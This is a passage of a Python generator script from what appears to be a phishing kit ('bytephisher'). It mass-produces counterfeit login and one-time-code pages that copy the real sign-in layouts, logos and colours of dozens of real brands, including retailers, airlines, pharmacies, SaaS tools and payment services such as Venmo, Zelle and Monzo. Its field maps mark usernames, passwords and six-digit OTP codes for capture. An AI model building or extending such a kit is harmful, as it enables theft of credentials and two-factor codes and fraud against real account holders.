    ('temu', 'Temu', '#FB7701', '#1B1B1B', 'email', 'verification code'),
    ('shein', 'SHEIN', '#000000', '#FF3F6C', 'email', 'verification code'),
    ('walmart', 'Walmart', '#0071CE', '#FFC220', 'email', 'verification code'),
    ('target', 'Target', '#CC0000', '#1B1B1B', 'email', 'verification code'),
    ('bestbuy', 'Best Buy', '#0046BE', '#FFF200', 'email', 'verification code'),
    ('ikea', 'IKEA', '#0058A3', '#FFDB00', 'email', 'verification code'),
    ('zara', 'Zara', '#000000', '#1B1B1B', 'email', 'verification code'),
    ('nike', 'Nike', '#111111', '#ffffff', 'email', 'verification code'),
    ('decathlon', 'Decathlon', '#0082C3', '#E1FF00', 'email', 'verification code'),
    ('makemytrip', 'MakeMyTrip', '#EB2226', '#1B3A5C', 'email', 'OTP'),
    ('goibibo', 'Goibibo', '#2D67C1', '#F7A800', 'phone', 'OTP'),
    ('yatra', 'Yatra', '#F26722', '#1B3A5C', 'email', 'OTP'),
    ('ixigo', 'ixigo', '#1B6FE3', '#FF6A00', 'phone', 'OTP'),
    ('cleartrip', 'Cleartrip', '#1B6FE3', '#F7A800', 'email', 'OTP'),
    ('agoda', 'Agoda', '#5C2D91', '#F7A800', 'email', 'verification code'),
    ('ola', 'Ola Cabs', '#1C8A43', '#F7A800', 'phone', 'OTP'),
    ('rapido', 'Rapido', '#F9C935', '#1B1B1B', 'phone', 'OTP'),
    ('redbus', 'redBus', '#D84E55', '#1B3A5C', 'phone', 'OTP'),
    ('indigo', 'IndiGo', '#0B2C7A', '#00A0DF', 'email', 'OTP'),
    ('airindia', 'Air India', '#E4002B', '#1B3A5C', 'email', 'OTP'),
    ('vistara', 'Vistara', '#4B2E83', '#F7A800', 'email', 'OTP'),
    ('emirates', 'Emirates', '#D71921', '#1B3A5C', 'email', 'verification code'),
    ('qatarairways', 'Qatar Airways', '#5C0632', '#B4A16A', 'email', 'verification code'),
    ('lufthansa', 'Lufthansa', '#05164D', '#F9BA00', 'email', 'verification code'),
    ('blinkit', 'Blinkit', '#F8CB46', '#1B1B1B', 'phone', 'OTP'),
    ('zepto', 'Zepto', '#5B2C8D', '#00C2A8', 'phone', 'OTP'),
    ('bigbasket', 'BigBasket', '#84C225', '#1B1B1B', 'phone', 'OTP'),
    ('dominos', "Domino's", '#006491', '#E31837', 'email', 'OTP'),
    ('pizzahut', 'Pizza Hut', '#EE3124', '#1B1B1B', 'email', 'OTP'),
    ('kfc', 'KFC', '#E4002B', '#1B1B1B', 'email', 'OTP'),
    ('mcdonalds', "McDonald's", '#FFC72C', '#DA291C', 'email', 'OTP'),
    ('starbucks', 'Starbucks', '#00704A', '#1B1B1B', 'email', 'OTP'),
    ('practo', 'Practo', '#28328C', '#00C2A8', 'phone', 'OTP'),
    ('tata1mg', 'Tata 1mg', '#FF6F61', '#1B3A5C', 'phone', 'OTP'),
    ('pharmeasy', 'PharmEasy', '#1C8A43', '#F7A800', 'phone', 'OTP'),
    ('apollopharmacy', 'Apollo Pharmacy', '#0F7B6C', '#F7A800', 'phone', 'OTP'),
    ('cultfit', 'cult.fit', '#0B0B0B', '#E5FF00', 'phone', 'OTP'),
    ('upgrad', 'upGrad', '#E4002B', '#1B3A5C', 'email', 'OTP'),
    ('simplilearn', 'Simplilearn', '#F26522', '#1B3A5C', 'email', 'OTP'),
    ('naukri', 'Naukri.com', '#FF7555', '#1B3A5C', 'email', 'OTP'),
    ('indeed', 'Indeed', '#003A9B', '#2557A7', 'email', 'verification code'),
    ('glassdoor', 'Glassdoor', '#0CAA41', '#1B1B1B', 'email', 'verification code'),
    ('freshworks', 'Freshworks', '#F26522', '#1B3A5C', 'email', 'verification code'),
    ('servicenow', 'ServiceNow', '#62D84E', '#032E61', 'email', 'verification code'),
    ('sap', 'SAP', '#0FAAFF', '#0A6ED1', 'username', 'verification code'),
    ('netsuite', 'NetSuite', '#1B5E8C', '#F26522', 'email', 'verification code'),
    ('zendesk', 'Zendesk', '#03363D', '#78A300', 'email', 'verification code'),
    ('intercom', 'Intercom', '#1F8DED', '#0B1F3A', 'email', 'verification code'),
    ('asana', 'Asana', '#F06A6A', '#1B1B1B', 'email', 'verification code'),
    ('monday', 'monday.com', '#FF3D57', '#1B1B1B', 'email', 'verification code'),
    ('airtable', 'Airtable', '#18BFFF', '#1B1B1B', 'email', 'verification code'),
    ('miro', 'Miro', '#FFD02F', '#1B1B1B', 'email', 'verification code'),
    ('box', 'Box', '#0061D5', '#1B1B1B', 'email', 'verification code'),
    ('sharepoint', 'SharePoint', '#038387', '#0078D4', 'email', 'verification code'),
    ('affirm', 'Affirm', '#4A4AF4', '#1B1B1B', 'email', 'verification code'),
    ('monzo', 'Monzo', '#FF4F40', '#1B3A5C', 'email', 'verification code'),
    ('n26', 'N26', '#36A18B', '#1B1B1B', 'email', 'verification code'),
    ('venmo', 'Venmo', '#3D95CE', '#1B1B1B', 'email', 'verification code'),
    ('cashapp', 'Cash App', '#00D632', '#1B1B1B', 'phone', 'verification code'),
    ('zelle', 'Zelle', '#6D1ED4', '#1B1B1B', 'phone', 'verification code'),
]

# This module runs two ways: as a script (python tools/gen_templates.py, where the
# script's own directory is already on sys.path) and as tools.gen_templates (where it is
# not). Put the directory on the path so the sibling modules resolve either way - the
# previous try/except silently yielded the 448 hardcoded sites when imported as a package.
_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

# A second, larger batch of brands kept in its own module so the list can grow without
# touching the generator. Same 6-tuple shape as SITES.
from template_brands import BRANDS as _EXTRA_BRANDS  # noqa: E402

# The page builder: each brand's own mark, colours and the layout its real sign-in page
# uses (a bare centred page, a split hero, a blue header, a phone frame, a bank portal).
from template_themes import render as _render_page  # noqa: E402

# The generator's own list, kept separate: the extra batch is checked against it, and a
# test can ask what the generator itself carries without the merged result.
BASE_SITES = list(SITES)
_have = {s[0] for s in SITES}
SITES = SITES + [b for b in _EXTRA_BRANDS if b[0] not in _have]


FIELD_LABELS = {
    "email":          [("email", "Email", "email", "you@example.com")],
    "username":       [("username", "Username or email", "text", "Enter your username")],
    "phone":          [("phone", "Phone number", "tel", "+1 555 000 0000")],
    "email_or_phone": [("login", "Email or phone number", "text", "Email or phone number")],
}

def favicon_uri(initial, brand):
    """Inline SVG favicon: a real tab icon, no external request."""
    svg = ("<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'>"
           f"<rect width='64' height='64' rx='14' fill='{brand}'/>"
           "<text x='32' y='44' font-family='Helvetica,Arial,sans-serif' "
           "font-size='34' font-weight='700' fill='#fff' text-anchor='middle'>"
           f"{initial}</text></svg>")
    from urllib.parse import quote
    return "data:image/svg+xml," + quote(svg)


SUBTITLES = {
    "email":          "Sign in with your email",
    "username":       "Sign in with your username",
    "phone":          "Sign in with your phone number",
    "email_or_phone": "Sign in to continue",
}


def build_site(slug, name, brand, accent, login_with, otp_label):
    """The three files for one brand: the login page, the code page and the field map.

    The page follows the layout that brand's real sign-in page uses, with the brand's
    own mark and colours (tools/template_themes.py). It carries the hidden template id,
    the honeypot field and the timing beacon the server and the tests rely on.
    """
    initial = name[0].upper()
    favicon = favicon_uri(initial, brand)
    html, otp_html = _render_page(slug, name, brand, accent, login_with, otp_label,
                                  FIELD_LABELS[login_with], SUBTITLES[login_with],
                                  favicon)
    fields_json = {
        "capture_fields": [f[0] for f in FIELD_LABELS[login_with]] + ["password"],
        "otp_fields": [f"otp_{i}" for i in range(1, 7)],
        "honeypot": "hp_email",
        "has_otp": True,
    }
    return html, otp_html, fields_json


VALID_LOGIN_WITH = {"email", "username", "phone", "email_or_phone"}


def validate_sites(sites=SITES):
    """Fail loudly on bad data instead of generating a broken template
    (a typo'd login_with would otherwise crash mid-generation)."""
    problems = []
    seen = set()
    for s in sites:
        slug, name, brand, accent, login_with, otp = s
        if login_with not in VALID_LOGIN_WITH:
            problems.append(f"{slug}: invalid login_with={login_with!r}")
        if slug != slug.lower() or " " in slug:
            problems.append(f"{slug}: slug must be lowercase with no spaces")
        if slug in seen:
            problems.append(f"{slug}: duplicate slug")
        seen.add(slug)
        for col in (brand, accent):
            if not col.startswith("#") or len(col) not in (4, 7):
                problems.append(f"{slug}: bad colour {col!r}")
    if problems:
        raise SystemExit("[gen_templates] invalid site data:\n  " + "\n  ".join(problems))
    return True


def main():
    validate_sites()
    os.makedirs(OUT, exist_ok=True)
    manifest = []
    for i, (slug, name, brand, accent, login_with, otp_label) in enumerate(SITES, 1):
        d = os.path.join(OUT, f"{i:02d}_{slug}")
        os.makedirs(d, exist_ok=True)
        html, otp_html, fields_json = build_site(slug, name, brand, accent, login_with, otp_label)
        with open(os.path.join(d, "index.html"), "w", encoding="utf-8") as f:
            f.write(html)
        with open(os.path.join(d, "otp.html"), "w", encoding="utf-8") as f:
            f.write(otp_html)
        with open(os.path.join(d, "fields.json"), "w", encoding="utf-8") as f:
            json.dump(fields_json, f, indent=2)
        # store the dir RELATIVE to the templates root: an absolute path baked at
        # generation time kept a copied/moved checkout pointing at the original
        # location (and --doctor only passed because that path still existed)
        manifest.append({"index": i, "slug": slug, "name": name,
                         "dir": os.path.basename(str(d))})
    with open(os.path.join(OUT, "templates.json"), "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2)
    print(f"[bytephisher] generated {len(manifest)} templates -> {OUT}")


if __name__ == "__main__":
    main()
